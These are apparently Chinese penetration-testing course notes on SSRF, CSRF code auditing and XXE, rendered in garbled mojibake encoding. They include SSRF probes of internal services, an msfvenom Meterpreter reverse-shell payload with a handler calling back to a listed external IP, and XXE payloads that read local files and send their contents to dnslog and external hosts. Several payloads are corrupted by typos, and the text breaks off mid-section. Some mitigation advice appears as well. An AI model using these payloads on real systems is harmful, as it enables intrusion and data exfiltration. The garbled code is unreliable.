<h4 id="SSRF-åŸç†-æœåŠ¡-åè®®-å†…ç½‘-æ¼æ´"><a href="#SSRF-åŸç†-æœåŠ¡-åè®®-å†…ç½‘-æ¼æ´" class="headerlink" title="#SSRF-åŸç†&amp;æœåŠ¡&amp;åè®®&amp;å†…ç½‘&amp;æ¼æ´"></a>#SSRF-åŸç†&amp;æœåŠ¡&amp;åè®®&amp;å†…ç½‘&amp;æ¼æ´</h4><p>-å‚è€ƒæ–‡ç« ï¼šhttps:w.t00ls.cc&#x2F;articles-41070.html<br>æ¡ˆä¾‹è¯´æ˜ï¼šå°è¿ªåœ¨æœ¬åœ°åˆ›å»ºäº†è¿œç¨‹å›¾ç‰‡æ–‡ä»¶åŠ è½½åº”ç”¨ï¼Œç›´æ¥è¢«æ”»å‡»è€…åˆ©ç”¨SSFæ¢é’ˆæœ¬åœ°<br>åŠå†…ç½‘æœåŠ¡ï¼Œå¹¶åˆ©ç”¨æŸæ¼æ´ç›´æ¥è·å–åˆ°å†…ç½‘æŸä¸»æœºçš„æƒé™ï¼<br>1ã€æœåŠ¡æ¢é’ˆï¼š<br><a href="http://127.0.0.1:8081/">http://127.0.0.1:8081/</a><br>htp:&#x2F;&#x2F;127.0.0.1:3306&#x2F;<br>2ã€åè®®ç©æ³•ï¼šï¼ˆæ›´å¤šç©æ³•è§ä¸Šå›¾ï¼‰<br>file:&#x2F;&#x2F;&#x2F;D:&#x2F;<a href="http://www.txt/">www.txt</a><br>dict:&#x2F;&#x2F;127.0.0.1:3306&#x2F;info<br><a href="ftp://192.168.46.148/">ftp://192.168.46.148:21</a><br>3ã€å†…é£æ‰«æï¼š<br><a href="http://192.168.46.148:8080/">http://192.168.46.148:8080</a><br>4ã€æ¼æ´åˆ©ç”¨ï¼š<br>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_http LHOST&#x3D;47.94.236.117<br>LPORT&#x3D;6688-f exe-o xx.exe<br>-ç›‘å¬ï¼š<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;meterpreter&#x2F;reverse_http<br>set Ihost 0.0.0.0<br>set Iport 6688<br>run<br>-ä¸‹è½½ï¼š<a href="http://192.168.46.148:8080/?search==%00">http://192.168.46.148:8080/?search==%00</a>(.execlcmd.exe%20&#x2F;c%20certutil%20-</p>
<h1 id="ç¬¬40å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-CSRF-SSRF-ä»£ç å®¡è®¡-åŒæºç­–ç•¥-åŠ è½½å‡½æ•°"><a href="#ç¬¬40å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-CSRF-SSRF-ä»£ç å®¡è®¡-åŒæºç­–ç•¥-åŠ è½½å‡½æ•°" class="headerlink" title="ç¬¬40å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;CSRF&amp;SSRF&amp;ä»£ç å®¡è®¡&amp;åŒæºç­–ç•¥&amp;åŠ è½½å‡½æ•°"></a>ç¬¬40å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;CSRF&amp;SSRF&amp;ä»£ç å®¡è®¡&amp;åŒæºç­–ç•¥&amp;åŠ è½½å‡½æ•°</h1><h4 id="çŸ¥è¯†ç‚¹-4"><a href="#çŸ¥è¯†ç‚¹-4" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h4><p>åŒä¸ŠèŠ‚</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-17"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-17" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>ä»£ç å®¡è®¡-CSRF.SCMSFHæ— éªŒè¯</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ€è·¯ï¼šæ·»åŠ ç”¨æˆ·å‡ºæŠ“åŒ…â€“ä½¿ç”¨CSRFæŠ“åŒ…å·¥å…·æ„é€ æ·»åŠ æŒ‡å®šç®¡ç†å‘˜è´¦æˆ·çš„htmlæ–‡ä»¶å¹¶å°†æ–‡ä»¶ä¸Šä¼ åˆ°vpsâ€“å—å®³è€…åœ¨ç½‘ç«™ä¿æŒç™»å½•çŠ¶æ€ä¸‹è®¿é—®æ„é€ å¥½çš„vpsæ–‡ä»¶é“¾æ¥â€“è§¦å‘csrfè¯­å¥æ·»åŠ æŒ‡å®šç®¡ç†å‘˜è´¦æˆ·</span><br><span class="line">ä»£ç å®¡è®¡ï¼šæ‰¾åˆ°æ·»åŠ ç®¡ç†å‘˜addå¤„ä»£ç â€“å‘ç°é™¤äº†æ·»åŠ è´¦æˆ·åçš„è§„åˆ™å¤–æ— å…¶ä»–è¿‡æ»¤â€“å­˜åœ¨csrfæ¼æ´</span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong>ä»£ç å®¡è®¡-CSRF-ZBLOGåŒæºç­–ç•¥</strong></p>
<blockquote>
<p>æ€è·¯ï¼šåŒä¸Šä¸èµ°æµ‹è¯•csrfæ¼æ´ï¼Œå‘ç°è¯­å¥æ‰§è¡Œè¿”å›é”™è¯¯ï¼Œä»£ç†å®¡è®¡å‘ç°æ·»åŠ ç®¡ç†å‘˜å‡ºå«æœ‰refererç›‘æµ‹â€“<br>ä¸¤ç§ç»•è¿‡æ€è·¯<br>1ã€ä¼ªé€ -éœ€è¦åœ¨ä»£ç æ•°æ®åŒ…æ–‡ä»¶å›ºå®šæ¥æº 2ã€å°è¯•åœ¨ç½‘ç«™å¯»æ‰¾å¯ä¸Šä¼ åœ°æ–¹ï¼Œä¸Šä¼ æ•°æ®åŒ…æ–‡ä»¶ï¼Œå–å¾—å½“å‰åŒåŸŸåè®¿é—®åœ°å€</p>
</blockquote>
<p><strong>ä»£ç å®¡è®¡-SSRF.YzmcmsåŠŸèƒ½&amp;å‡½æ•°</strong></p>
<blockquote>
<p>æ€è·¯ï¼šé‡‡é›†åŠŸèƒ½å¤„å†™å…¥æ–‡ä»¶è¯»å–ä»£ç â€“è¯»å–åˆ°æœåŠ¡å™¨ä¸‹æ–‡ä»¶</p>
</blockquote>
<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF:"></a>SSRF:</h4><p>1ã€ç‰¹å®šæ¼æ´åŠŸèƒ½-&gt;ä»£ç æ®µåˆ†æå®¡è®¡<br>2ã€ç‰¹å®šæ¼æ´å‡½æ•°-&gt;æµ‹è¯•å¯¹åº”åŠŸèƒ½åˆ¤æ–­<br>åŠŸèƒ½ç‚¹-é‡‡é›†å®¡è®¡<br>é‡‡é›†æ·»åŠ -æµ‹è¯•-æŠ“åŒ…-ä»£ç -è¿œç¨‹è¯·æ±‚èµ„æºæ“ä½œï¼ˆå‡½æ•°ï¼‰<br>å‡½æ•°-åŠŸèƒ½å®¡è®¡<br>file_get_contents</p>
<h4 id="ç‰¹æ€§æŒ–æ˜å®¡è®¡"><a href="#ç‰¹æ€§æŒ–æ˜å®¡è®¡" class="headerlink" title="ç‰¹æ€§æŒ–æ˜å®¡è®¡"></a>ç‰¹æ€§æŒ–æ˜å®¡è®¡</h4><p>1.ç›´æ¥å¤ç°æœ‰æ²¡æœ‰<br>æˆåŠŸ-&gt;æœ‰æ¼æ´<br>å¤±è´¥-&gt;ä»£ç -&gt;ç¼ºé™·è¿‡æ»¤ï¼ˆç»•è¿‡ï¼‰-&gt;æœ‰æ¼æ´<br>å¤±è´¥-&gt;ä»£ç -&gt;å®Œæ•´è¿‡æ»¤-&gt;æ²¡æœ‰æ¼æ´<br>æ¥æºæ£€æµ‹ï¼š<br>1ã€ä¼ªé€ -éœ€è¦åœ¨ä»£ç æ•°æ®åŒ…æ–‡ä»¶å›ºå®šæ¥æº<br>2ã€å°è¯•åœ¨ç½‘ç«™å¯»æ‰¾å¯ä¸Šä¼ åœ°æ–¹ï¼Œä¸Šä¼ æ•°æ®åŒ…æ–‡ä»¶ï¼Œå–å¾—å½“å‰åŒåŸŸåè®¿é—®åœ°å€</p>
<h4 id="å…¶ä»–æ¼æ´ï¼š"><a href="#å…¶ä»–æ¼æ´ï¼š" class="headerlink" title="å…¶ä»–æ¼æ´ï¼š"></a>å…¶ä»–æ¼æ´ï¼š</h4><p>å…³é”®å‡½æ•°å’Œåº”ç”¨åŠŸèƒ½</p>
<h1 id="ç¬¬41å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-XML-XXE-æ— å›æ˜¾-DTDå®ä½“-ä¼ªåè®®-ä»£ç å®¡è®¡"><a href="#ç¬¬41å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-XML-XXE-æ— å›æ˜¾-DTDå®ä½“-ä¼ªåè®®-ä»£ç å®¡è®¡" class="headerlink" title="ç¬¬41å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;XML&amp;XXE&amp;æ— å›æ˜¾&amp;DTDå®ä½“&amp;ä¼ªåè®®&amp;ä»£ç å®¡è®¡"></a>ç¬¬41å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;XML&amp;XXE&amp;æ— å›æ˜¾&amp;DTDå®ä½“&amp;ä¼ªåè®®&amp;ä»£ç å®¡è®¡</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯´æ˜ï¼šxxeè¿™ä¸ªçŸ¥è¯†ç‚¹ä¹Ÿæ˜¯CTFèµ›é¢˜ä¸­çš„çƒ­é—¨è€ƒç‚¹ä¹‹ä¸€ï¼Œæ˜¯OWASPä¸­çš„ä¸€éƒ¨åˆ†ï¼Œé¢è¯•çŸ¥è¯†ç‚¹ä»€ä¹ˆçš„å¾ˆå®¹æ˜“é—®åˆ°çš„ã€‚</span><br></pre></td></tr></table></figure>

<h4 id="çŸ¥è¯†ç‚¹ï¼š-21"><a href="#çŸ¥è¯†ç‚¹ï¼š-21" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€XML&amp;XXE-åŸç†&amp;å‘ç°&amp;åˆ©ç”¨&amp;ä¿®å¤ç­‰<br>2ã€ML&amp;XXEé»‘ç›’æ¨¡å¼ä¸‹çš„å‘ç°ä¸åˆ©ç”¨<br>3ã€XML&amp;XXE-ç™½ç›’æ¨¡å¼ä¸‹çš„å®¡è®¡ä¸åˆ©ç”¨<br>4ã€XML&amp;XXE-æ— å›æ˜¾&amp;ä¼ªåè®®&amp;äº§ç”Ÿå±‚é¢</p>
<h4 id="æ€è·¯ç‚¹ï¼š"><a href="#æ€è·¯ç‚¹ï¼š" class="headerlink" title="#æ€è·¯ç‚¹ï¼š"></a>#æ€è·¯ç‚¹ï¼š</h4><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p>
<p>-XXEé»‘ç›’å‘ç°ï¼š</p>
<blockquote>
<p>1ã€è·å–å¾—åˆ°Content-Typeæˆ–æ•°æ®ç±»å‹ä¸ºxmlæ—¶ï¼Œå°è¯•è¿›è¡Œxmlè¯­è¨€payloadè¿›è¡Œæµ‹è¯•<br>2ã€ä¸ç®¡è·å–çš„Content-Typeç±»å‹æˆ–æ•°æ®ä¼ è¾“ç±»å‹ï¼Œå‡å¯å°è¯•ä¿®æ”¹åæäº¤æµ‹è¯•XXE<br>3ã€XXEä¸ä»…åœ¨æ•°æ®ä¼ è¾“ä¸Šå¯èƒ½å­˜åœ¨æ¼æ´ï¼ŒåŒæ ·åœ¨æ–‡ä»¶ä¸Šä¼ å¼•ç”¨æ’ä»¶è§£ææˆ–é¢„è§ˆä¹Ÿä¼šé€ æˆæ–‡ä»¶ä¸­çš„XXE Payloadè¢«æ‰§è¡Œ</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ³¨ï¼šä¸€èˆ¬åœ¨CTFé¢˜ç›®ä¸­éƒ½ä¼šæ¯”è¾ƒåˆ»æ„ï¼Œå°±èƒ½å¤Ÿå»ç›´æ¥å‘ç°æ‰¾åˆ°xmlçš„æ ¼å¼ï¼Œç”šè‡³æœ‰äº›é¢˜è¿˜ä¼šç›´æ¥ç»™å‡ºxmlæ–‡ä»¶ã€‚</span><br></pre></td></tr></table></figure>

<p><strong>-XXEç™½ç›’å‘ç°ï¼š</strong></p>
<blockquote>
<p>1ã€å¯é€šè¿‡åº”ç”¨åŠŸèƒ½è¿½è¸ªä»£ç å®šä½å®¡è®¡<br>2ã€å¯é€šè¿‡è„šæœ¬ç‰¹å®šå‡½æ•°æœç´¢å®šä½å®¡è®¡<br>3ã€å¯é€šè¿‡ä¼ªåè®®ç©æ³•ç»•è¿‡ç›¸å…³ä¿®å¤ç­‰</p>
</blockquote>
<p>è¯¦ç»†ç‚¹ï¼š</p>
<blockquote>
<p>XMLè¢«è®¾è®¡ä¸ºä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼ŒMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ï¼Œå…¶æŠŠæ•°æ®ä»HTMLåˆ†ç¦»ï¼Œæ˜¯ç‹¬ç«‹äºè½¯ä»¶å’Œç¡¬ä»¶çš„ä¿¡æ¯ä¼ è¾“å·¥å…·ã€‚XXEæ¼æ´å…¨ç§°KML External Entity Injection,å³xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼ŒXXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ç­‰å±å®³ã€‚</p>
</blockquote>
<p><strong>XMLä¸HTMLçš„ä¸»è¦å·®å¼‚ï¼š</strong></p>
<blockquote>
<p>XMLè¢«è®¾è®¡ä¸ºä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ã€‚<br>HTMLè¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å¤–è§‚ã€‚<br>HTMLæ—¨åœ¨æ˜¾ç¤ºä¿¡æ¯ï¼Œè€ŒXMLæ—¨åœ¨ä¼ è¾“ä¿¡æ¯ã€‚</p>
</blockquote>
<h4 id="XXEä¿®å¤é˜²å¸æ–¹æ¡ˆï¼š"><a href="#XXEä¿®å¤é˜²å¸æ–¹æ¡ˆï¼š" class="headerlink" title="XXEä¿®å¤é˜²å¸æ–¹æ¡ˆï¼š"></a>XXEä¿®å¤é˜²å¸æ–¹æ¡ˆï¼š</h4><p>-æ–¹æ¡ˆ1-ç¦ç”¨å¤–éƒ¨å®ä½“</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line">libxml disable_entity_loader(true);</span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf</span><br><span class="line">=DocumentBuilderFactory.newlnstanceï¼ˆï¼‰:dbf.setExpandEntityReferences(false).</span><br><span class="line">Python:</span><br><span class="line"><span class="keyword">from</span> Ixml <span class="keyword">import</span> etreexmlData</span><br><span class="line">etree.parse(xmiSource,etree.XMLParser(resolve entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure>

<p>-æ–¹æ¡ˆ2-è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">è¿‡æ»¤å…³é”®è¯ï¼š&lt;IDOCTYPEå’Œ&lt;IENTITY,æˆ–è€…SYSTEMå’ŒPUBLIC</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/5782d6c9d75646441930bebec4b15949.png" alt="img"></p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-18"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-18" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>XML&amp;XXE-é»‘ç›’-åŸç†&amp;æ¢é’ˆ&amp;åˆ©ç”¨&amp;ç©æ³•ç­‰<br>XML&amp;XXE-å‰ç«¯-CTF&amp;Jarvisoj&amp;æ¢é’ˆ&amp;åˆ©ç”¨<br>XML&amp;XXE-ç™½ç›’-CMS&amp;PHPSHE&amp;æ— å›æ˜¾å®¡è®¡</p>
<h4 id="XML-XXEé»‘ç›’-åŸç†-æ¢é’ˆ-åˆ©ç”¨-ç©æ³•ç­‰"><a href="#XML-XXEé»‘ç›’-åŸç†-æ¢é’ˆ-åˆ©ç”¨-ç©æ³•ç­‰" class="headerlink" title="#XML&amp;XXEé»‘ç›’-åŸç†&amp;æ¢é’ˆ&amp;åˆ©ç”¨&amp;ç©æ³•ç­‰"></a>#XML&amp;XXEé»‘ç›’-åŸç†&amp;æ¢é’ˆ&amp;åˆ©ç”¨&amp;ç©æ³•ç­‰</h4><blockquote>
<p>æ€è·¯ï¼šæœ¬åœ°é¶åœºæŠ“åŒ…å‘ç°postæäº¤çš„å‚æ•°ä¸­æ ¼å¼ä¸ºxmlæ ¼å¼ä¸”content-typeä¸ºapplication&#x2F;xmlåˆ¤å®šä¸ºxmlâ€“ä¿®æ”¹æ•°æ®åŒ…å°è¯•è¯»å–æ–‡ä»¶å†…å®¹â€“æ­¤æ—¶è‹¥æ— å›æ˜¾å°è¯•è¿›è¡Œæ•°æ®å¤–å¸¦å‘ç°èƒ½å¤Ÿå®ç°â€“å¼•ç”¨å¤–éƒ¨å®ä½“evil2.dtdæ–‡ä»¶è¿›è¡Œè¯»å–ï¼ˆæ­¤æ—¶è‹¥æ— å›æ˜¾ä¹Ÿæ— æ³•å®ç°ï¼‰â€“æœ€ååˆ©ç”¨å¤–å¸¦å’Œå¼•ç”¨å¤–éƒ¨å®ä½“å…ˆè¯»å–è¿™ä¸ªe.txtï¼Œè¯»å–åˆ°çš„ä¿¡æ¯å¤åˆ¶ç»™å˜é‡fileã€‚ç„¶åå¼•ç”¨å¤–éƒ¨å®ä½“test.dtdï¼Œç„¶åå¤–éƒ¨å®ä½“é‡Œé¢å†™ä¸Šç”¨get.phpè¿™ä¸ªæ–‡ä»¶çš„fileå‚æ•°å»æ¥æ”¶ä¸Šé¢çš„å˜é‡fileçš„å†…å®¹ã€‚é‚£ä¹ˆæœ€åæˆ‘ä»¬è¯»å–åˆ°çš„å†…å®¹å°±ä¼šåœ¨file.txtè¿™ä¸ªæ–‡æœ¬æ–‡æ¡£ä¸­æ˜¾ç¤º</p>
</blockquote>
<p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/20175211lyzp/11413335.html">https://www.cnblogs.com/20175211lyzp/11413335.html</a></p>
<p>1ã€è¯»å–æ–‡ä»¶ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IDOCTYPE</span> <span class="attr">Mikasa</span>[</span></span><br><span class="line"><span class="tag">&lt;<span class="attr">IENTITY</span> <span class="attr">test</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">file:</span>///<span class="attr">d</span>/<span class="attr">e.txt</span>&quot;&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">usemname</span>&gt;</span>&amp;test<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>Mikasa<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.1å¸¦å¤–æµ‹è¯•ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IDOCTYPE</span> <span class="attr">test</span>[</span></span><br><span class="line"><span class="tag">&lt;<span class="attr">IENTITY</span> <span class="attr">file</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">http:</span>//<span class="attr">9v57ll.dnslog.cn</span>&quot;&gt;</span></span><br><span class="line">%file;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">usemame</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>Mikasa<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2ã€å¤–éƒ¨å¼•ç”¨å®ä½“dtd:<br>å®ä½“å¼•ç”¨ï¼šå¼•ç”¨è¿œç¨‹çš„evil2.dtdæ–‡ä»¶<br>1ã€è§£å†³æ‹¦æˆªé˜²æŠ¤ç»•è¿‡é—®é¢˜<br>2ã€è§£å†³æ•°æ®ä¸å›æ˜¾é—®é¢˜</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IDOCTYPE</span> <span class="attr">test</span>[</span></span><br><span class="line"><span class="tag">&lt;<span class="attr">IENTITY</span> <span class="attr">file</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">http:</span>//<span class="attr">127.0.0.1:8081</span>/<span class="attr">evil2.dtd</span>&quot;&gt;</span></span><br><span class="line">%file,</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">usemame</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>Mikasa<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">evil2.dtd   è¯»å–e.txtæ–‡ä»¶</span><br><span class="line"><span class="tag">&lt;<span class="name">IENTITY</span> <span class="attr">send</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">file:</span>///<span class="attr">d:</span>/<span class="attr">e.txt</span>&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<p>3ã€æ— å›æ˜¾è¯»æ–‡ä»¶ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IDOCTYPE</span> <span class="attr">ANY</span>[</span></span><br><span class="line"><span class="tag">&lt;<span class="attr">IENTITY</span> <span class="attr">file</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">file:</span>///<span class="attr">d:</span>/<span class="attr">e.tct</span></span></span><br><span class="line"><span class="tag">&lt;<span class="attr">IENTITY</span> <span class="attr">remote</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">http:</span>//<span class="attr">47.94.236.117</span>/<span class="attr">testdtd</span>&quot;&gt;</span></span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">test.dtd</span><br><span class="line"><span class="tag">&lt;<span class="name">IENTITY</span> % <span class="attr">all</span> &quot;&lt;<span class="attr">IENTITY</span> <span class="attr">send</span> <span class="attr">SYSTEM</span> &#x27;<span class="attr">http:</span>//<span class="attr">47.94.236.117</span>/<span class="attr">get.php</span>?<span class="attr">file</span>=<span class="string">%file;</span>&#x27;&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="XML-XXE-å‰ç«¯-CTF-Jarvisoj-æ¢é’ˆ-åˆ©ç”¨"><a href="#XML-XXE-å‰ç«¯-CTF-Jarvisoj-æ¢é’ˆ-åˆ©ç”¨" class="headerlink" title="#XML&amp;XXE-å‰ç«¯-CTF&amp;Jarvisoj&amp;æ¢é’ˆ&amp;åˆ©ç”¨"></a>#XML&amp;XXE-å‰ç«¯-CTF&amp;Jarvisoj&amp;æ¢é’ˆ&amp;åˆ©ç”¨</h4><p>æ€è·¯ï¼šé€šè¿‡å‰ç«¯ä»£ç å‘ç°å‚æ•°çš„ä¼ é€’æ˜¯é€šè¿‡xmlå®ç°çš„ï¼Œæ­¤æ—¶æŠ“åŒ…æ„é€ æ•°æ®åŒ…å°è¯•è¿›è¡Œæ–‡ä»¶è¯»å–æŠ¥é”™æ˜¯å› ä¸ºæ–‡ä»¶ç±»å‹ä¸ºjsonä¿®æ”¹ä¸ºxmlåè¿”å›æ­£ç¡®<br><a href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a><br>XXEé»‘ç›’å‘ç°ï¼š<br>1ã€è·å–å¾—åˆ°Content-Typeæˆ–æ•°æ®ç±»å‹ä¸ºXmlæ—¶ï¼Œå°è¯•è¿›è¡Œxmlè¯­è¨€payloadè¿›è¡Œæµ‹è¯•<br>2ã€ä¸ç®¡è·å–çš„Content-Typeç±»å‹æˆ–æ•°æ®ä¼ è¾“ç±»å‹ï¼Œå‡å¯å°è¯•ä¿®æ”¹åææ–‡æµ‹è¯•xxe<br>æµç¨‹ï¼šåŠŸèƒ½åˆ†æ-å‰ç«¯ææ–‡-æºç &amp;æŠ“åŒ…æ„é€ Paylodæµ‹è¯•<br>æ›´æ”¹æ¸…æ±‚æ®æ ¼å¼ï¼šContent-Type</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0?&gt;</span></span></span><br><span class="line"><span class="string"><span class="meta">&lt;!DOCTYPE ANY I</span></span></span><br><span class="line"><span class="string"><span class="meta">&lt;!ENTITY f SYSTEM&quot;</span> file:///home/ctf/fiao.txt&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="meta">&lt;x&gt;&amp;&lt;/x&gt;</span></span><br></pre></td></tr></table></figure>

<p>#XML&amp;XOXE-ç™½ç›’-CMS&amp;PHPSHE&amp;æ— å›æ˜¾å®¡è®¡<br>æ€è·¯ï¼šé€šè¿‡å…¨å±€æœç´¢xmlè§£æå‡½æ•°é€æ­¥æ‰¾åˆ°å­˜åœ¨æ¼æ´çš„å‡½æ•°å’Œæ–‡ä»¶â€“æŠ“åŒ…æ”¹åŒ…æµ‹è¯•è‹¥å¤–å¸¦å‡ºæ•°æ®åˆ™è¯æ˜æ¼æ´å­˜åœ¨<br>å®¡è®¡æµç¨‹ï¼š<br>1ã€æ¼æ´å‡½æ•°simplexml_load_string<br>2ã€pe_getxmlå‡½æ•°è°ƒç”¨äº†æ¼æ´å‡½æ•°<br>3ã€wechat_getxmliè°“ç”¨äº†pe_getxml<br>4ã€notify_urtgç”¨äº†wechat_getxml<br>æ¼æ´å‡½æ•°åœ¨è‡ªå®šä¹‰å‡½æ•°be getxmlgé‡Œé¢-&gt;è°è°ƒç”¨äº†pe_getxmlâ€“&gt;wechat_getxmlâ€“æ‰¾åˆ°å¹¶è®¿é—®å­˜åœ¨æ¼æ´çš„æ–‡ä»¶<br>è®¿é—®notify_urlæ–‡ä»¶è§¦å‘wechat_getxmlEå‡½æ•°ï¼Œæ„é€ Paylodæµ‹è¯•<br>å…ˆå°è¯•è¯»å–æ–‡ä»¶ï¼Œæ— å›æ˜¾åå¸¦å¤–æµ‹è¯•ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IDOCTYPE</span> <span class="attr">test</span>[</span></span><br><span class="line"><span class="tag">&lt;<span class="attr">IENTITY</span> <span class="attr">file</span> <span class="attr">SYSTEM</span> &quot;<span class="attr">http:</span>//<span class="attr">1uwlwv.dnslog.cn</span>&quot;&gt;</span></span><br><span class="line">%file.</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">usemame</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>Mikasa<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åå¸¦å¤–ä¼ é€’æ•°æ®è§£å†³æ— å›æ˜¾ï¼š</p>
